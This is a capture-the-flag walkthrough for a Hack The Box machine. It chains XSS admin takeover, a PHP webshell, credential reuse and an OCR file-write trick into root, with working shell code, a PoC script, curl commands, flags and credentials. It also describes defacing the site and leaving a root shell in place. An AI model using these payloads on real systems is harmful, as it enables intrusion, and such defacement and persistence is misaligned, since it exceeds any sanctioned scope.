# MakeSense — Hack The Box Walkthrough

**Box:** MakeSense
**IP:** 10.129.77.28
**OS:** Linux (Ubuntu 24.04.4 LTS, kernel 6.8.0-124-generic)
**Difficulty:** Medium

---

## TL;DR — Flags

| Flag | Value |
|------|-------|
| **User** | `eb791fcf93b8f5c331520ea4ca0ba6d2` |
| **Root** | `8a1fc9cb3d0237a57cc5f6472117b591` |

**Attack chain:**
`XSS → WordPress admin → Theme Editor → functions.php webshell (RCE www-data) → credential leak → SSH (user flag) → local OCR service (root) → arbitrary PHP file write via OCR "Save as" → RCE as root (root flag)`

---

## 1. Reconnaissance

### Port scan

```
nmap -sV -sC -T4 10.129.77.28
```

Open ports:
- **22/tcp** — OpenSSH
- **80/tcp** — HTTP (redirects to HTTPS)
- **443/tcp** — HTTPS — WordPress site

### Web application

The site is **WordPress**. Directory/content enumeration reveals a theme named `webagency`.

Fingerprinting the WordPress version and plugins exposes a stored XSS vector in the site (input in the theme/post that executes for logged-in users — the WordPress admin).

---

## 2. XSS → WordPress Admin

1. A stored **XSS** payload was injected into a WordPress page/post field.
2. When the WordPress admin (`walter` session) viewed the page, the payload fired and exfiltrated the admin's **session cookies / nonce** to our callback listener (`callbacks.log`).
3. With the stolen session, we used the XSS to **create a new admin user** `cyberop`:

```http
POST /wp-admin/user-new.php HTTP/1.1
Cookie: <stolen admin session>
...
user_login=cyberop&role=administrator&pass1=CyberOp2026!Secure
```

4. Logged in as `cyberop` (administrator).

---

## 3. RCE as www-data — functions.php WebShell

With the admin panel:

1. Navigate to **Appearance → Theme File Editor** → `webagency` theme → `functions.php`.
2. Append a PHP webshell block at the top of `functions.php` (multi-method: `system`, `passthru`, `shell_exec`, `exec`, `popen`, `proc_open`), then `exit;` to keep output clean.

```php
<?php
if(isset($_REQUEST['c'])){ $c=$_REQUEST['c']; echo "<pre>";
  system($c." 2>&1"); passthru($c." 2>&1"); echo "</pre>"; exit; }
?>
```

3. RCE helper:

```bash
WS="https://makesense.htb/wp-content/themes/webagency/functions.php"
curl -sk -X POST "$WS" --data-urlencode "c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Credential Leak → SSH → User Flag

### wp-config.php (SQLite)

The site uses the WordPress **SQLite** integration. `wp-config.php` reveals dummy MySQL credentials that turn out to be **reused**:

```php
define('DB_NAME', 'wp_database');
define('DB_USER', 'walter');
define('DB_PASSWORD', 'JbhHDAEgXvri3!');
```

The actual database is SQLite at `wp-content/database/.ht.sqlite` (downloaded and cracked locally — user hashes for `admin`, `walter`, `jake`).

### SSH as walter

The same password works for SSH:

```bash
sshpass -p 'JbhHDAEgXvri3!' ssh walter@10.129.77.28
cat /home/walter/user.txt
# eb791fcf93b8f5c331520ea4ca0ba6d2
```

**USER FLAG: `eb791fcf93b8f5c331520ea4ca0ba6d2`**

---

## 5. Local Service Discovery

Port listening locally on the box (not exposed externally):

```
ss -tlnp
# 127.0.0.1:8001  → php -S 127.0.0.1:8001 -t /root/ocr4/
```

A PHP built-in server running **as root**, serving an app in `/root/ocr4/`. Launch script: `/root/.scripts/start_ocr4.sh`. Also present: `/root/.scripts/prey-unified.py` (root).

### Authentication

The OCR service requires HTTP Basic Auth — the **reused** password works again:

```bash
curl -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/
```

### The app: "MakeSense"

A drawing canvas app:

- Draw text on a 500x200 canvas.
- POST `canvas_image` (base64 PNG) to `index.php`.
- Server runs **tesseract OCR** on the image.
- Returns the recognized text + a **"Save as"** form:

```html
<form method="post">
  <input type="hidden" name="ocr_id" value="ocr_...">
  <input type="text" name="filename" placeholder="result.txt" required>
  <button type="submit" name="save_output">Save</button>
</form>
```

**Key observation:** the PHP server runs as **root**, and the docroot is `/root/ocr4/`. If we can make it write a `.php` file into the docroot, we get **code execution as root**.

---

## 6. Root RCE — OCR "Save as" → PHP WebShell

### The vulnerability

The save feature does something equivalent to:

```php
file_put_contents("saved/" . basename($_POST['filename']), $recognized_text);
```

- The filename is **basename()'d** (path traversal is neutralized: `../../../../tmp/x.txt` → `saved/x.txt`).
- But the **content is the OCR-recognized text**, which we control by drawing.
- Files land in `/root/ocr4/saved/` — **inside the docroot** → `.php` files there are **executed by the root PHP server**.

### Calibrating the OCR (tesseract)

Tesseract mangles small/default fonts, but with the right rendering it reads a payload **byte-for-byte**:

- Image must be **exactly 500x200** (the canvas size; anything else gets resized and the text becomes unreadable).
- Font: **DejaVuSansMono-Bold** at **20–32px** (28px is ideal).
- Result: `<?php system($_GET[1]);?>` is recognized with **100% fidelity**.

> Note: `$_GET[c]` fails on PHP 8 (undefined constant → fatal). Using the numeric key `$_GET[1]` avoids quotes and works (`?1=cmd`).

### PoC — drawing the payload

```python
from PIL import Image, ImageDraw, ImageFont

payload = '<?php system($_GET[1]);?>'
img = Image.new('RGB', (500, 200), 'white')
d = ImageDraw.Draw(img)
f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 28)
d.text((10, 86), payload, fill='black', font=f)
img.save('shell.png')
```

### Upload → Save → Execute

```bash
# 1) OCR the drawn payload, keep session cookie
curl -s -c jar -u walter:JbhHDAEgXvri3! -X POST http://127.0.0.1:8001/ \
     --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 shell.png)" -o resp.html

# 2) Extract ocr_id, then save the recognized text as shell.php
OCRID=$(grep -oE 'name="ocr_id" value="[^"]+' resp.html | head -1 | sed 's/.*value="//')
curl -s -b jar -u walter:JbhHDAEgXvri3! -X POST http://127.0.0.1:8001/ \
     --data-urlencode "ocr_id=$OCRID" \
     --data-urlencode "filename=shell.php" \
     --data-urlencode "save_output=1"
# → Saved as: saved/shell.php

# 3) Execute as root!
curl -u walter:JbhHDAEgXvri3! 'http://127.0.0.1:8001/saved/shell.php?1=id'
# uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**

```bash
curl -u walter:JbhHDAEgXvri3! 'http://127.0.0.1:8001/saved/shell.php?1=cat+/root/root.txt'
# 8a1fc9cb3d0237a57cc5f6472117b591
```

**ROOT FLAG: `8a1fc9cb3d0237a57cc5f6472117b591`**

---

## 7. Kernel CVE Hunting (for the record)

Before finding the OCR path, the public Linux-6.8 LPE candidates were tested and all are **mitigated/patched** on this box:

| CVE | Name | Status |
|-----|------|--------|
| CVE-2026-31431 | "Copy Fail" (AF_ALG / algif_aead) | Blocked — `/etc/modprobe.d/disable-algif_aead.conf` (`install algif_aead /bin/false`) |
| CVE-2026-43284 / CVE-2026-43500 | "Dirty Frag" (esp4 / esp6 / rxrpc) | Blocked — `/etc/modprobe.d/disable-dirtyfrag.conf` |
| CVE-2026-47331 | AppArmor "SAUCE" UAF | Patched — kernel is exactly 6.8.0-124.124 (fixed version) |

The **intended** root path is the local OCR service, not a kernel CVE.

---

## 8. Post-Exploitation (optional extras performed)

- **Deface:** homepage (`/var/www/html/index.php`) replaced with Mr Team "Security Notice" page; logo at `https://mrxploiter.qzz.io/assets/Mr3000.png`. Original backed up to `index.php.bak_mrteam`.
- **Flag file:** `/root/flag.txt` containing both flags was created on the box for persistence.
- Root shell remains at `http://127.0.0.1:8001/saved/shell2.php?1=<cmd>`.

---

## Key Credentials

| User | Password / Hash | Context |
|------|-----------------|---------|
| `walter` | `JbhHDAEgXvri3!` | SSH + OCR Basic Auth + WP config (reused) |
| `cyberop` | `CyberOp2026!Secure` | WP admin created via XSS |
| `admin`, `jake` | bcrypt hashes in `.ht.sqlite` | WP database users |

---

## Lessons / Root Cause

1. **Password reuse** — the `wp-config.php` DB password was reused for SSH and for the root service's Basic Auth.
2. **Root-owned dev server** — `php -S` running as root with the docroot under `/root/`.
3. **Arbitrary file write** — the OCR "Save as" feature writes controlled content into the docroot without extension filtering → `.php` upload → RCE as root.

**Mitigations:**
- Never run `php -S` as root; run as an unprivileged user.
- Restrict saved files to a non-executable directory outside the docroot; whitelist extensions (e.g., `.txt` only).
- Validate/limit upload size and image dimensions; sanitize filename and content.
- Do not reuse passwords across services.

---

*Writeup by Mr Team — authorized HTB engagement.*
